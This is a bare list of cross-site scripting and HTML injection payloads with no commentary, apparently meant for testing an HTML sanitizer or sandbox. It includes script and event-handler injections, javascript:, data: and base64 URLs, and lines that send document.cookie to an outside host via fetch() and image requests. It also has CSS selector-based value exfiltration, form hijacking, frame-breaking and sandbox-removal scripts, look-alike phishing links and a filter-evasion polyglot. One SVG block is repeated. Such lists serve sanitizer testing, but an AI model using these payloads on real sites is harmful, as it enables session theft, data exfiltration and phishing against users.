<script>alert(1)</script>
<script>document.body.innerHTML='pwned'</script>
<script>fetch('https://google.com/?c='+document.cookie)</script>
<script>new Image().src='https://google.com/?c='+document.cookie</script>

<img src=x onerror="alert(1)">
<img src=x onerror="fetch('https://google.com/?img-leak')">
<img src=x onerror=alert(1)>
<body onload="alert(1)">
<input autofocus onfocus="alert(1)">
<input autofocus onfocus="fetch('https://google.com/?focus-leak')">
<details open ontoggle="alert(1)">
<marquee onstart="alert(1)">x</marquee>
<video><source onerror="alert(1)">
<select autofocus onfocus=alert(1)><option>x</option></select>
<textarea autofocus onfocus=alert(1)>

  <a href="javascript:alert(1)">click</a>
<a href="javascript:fetch('https://google.com/?js-link')">click</a>
<a href="JaVaScRiPt:alert(1)">case test</a>
<a href="java&#9;script:alert(1)">tab trick</a>
<a href="data:text/html,<script>alert(1)</script>">data link</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">base64 data</a>
<a href="vbscript:msgbox(1)">vb link</a>
<iframe src="javascript:alert(1)"></iframe>
<iframe src="data:text/html,<script>fetch('https://google.com/?iframe-data')</script>"></iframe>


<svg onload="alert(1)">
<svg onload="fetch('https://google.com/?svg-leak')">
<svg><script>alert(1)</script></svg>
<svg><script>fetch('https://google.com/?svg-script')</script></svg>
<svg><animate onbegin="alert(1)" attributeName=x dur=1s>
<svg><a xlink:href="javascript:alert(1)"><text x=20 y=20>click</text></a></svg>
<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>


<svg onload="alert(1)">
<svg onload="fetch('https://google.com/?svg-leak')">
<svg><script>alert(1)</script></svg>
<svg><script>fetch('https://google.com/?svg-script')</script></svg>
<svg><animate onbegin="alert(1)" attributeName=x dur=1s>
<svg><a xlink:href="javascript:alert(1)"><text x=20 y=20>click</text></a></svg>
<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>

<meta http-equiv="refresh" content="0;url=https://google.com">
<a href="https://google.com" target="_top">break out</a>
<a href="https://google.com" target="_parent">parent nav</a>
<base href="https://google.com/">
<script>top.location='https://google.com'</script>
<script>parent.location='https://google.com'</script>


<form action="https://google.com" method="POST"><input name="x" value="stolen"><input type="submit" value="click"></form>
<form action="https://google.com" method="GET"><input name="leak" value="data"><input type="submit"></form>
<button formaction="https://google.com" form="x">click</button>
<form id="x"></form>


<style>body{background:url('https://google.com/?css-bg')}</style>
<link rel="stylesheet" href="https://google.com/x.css">
<style>@import url('https://google.com/x.css');</style>
<style>input[value^="a"]{background:url('https://google.com/?starts-with-a')}</style>
<style>input[value^="b"]{background:url('https://google.com/?starts-with-b')}</style>
<div style="background:url('https://google.com/?inline-style')">x</div>
<style>@font-face{font-family:x;src:url('https://google.com/?font-leak')}body{font-family:x}</style>



<script>window.parent.document.querySelector('iframe').removeAttribute('sandbox')</script>
<script>top.location='https://google.com'</script>
<script>parent.postMessage('escape-attempt','*')</script>
<script>open('https://google.com')</script>
<script>window.parent.location='https://google.com'</script>
<script>document.domain=document.domain</script>


<a href="https://evil-but-google.com">https://google.com</a>
<a href="https://gооgle.com">google.com</a>
<a href="https://google.com.evil.example">google.com.evil.example</a>
<a href="https://google.com@evil.example">https://google.com</a>
<a href="https://google%E2%80%8B.com">zero-width space</a>


jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
"><script>alert(1)</script>
'><svg onload=alert(1)>
"><img src=x onerror=alert(1)>
</textarea><script>alert(1)</script>
</title><script>alert(1)</script>





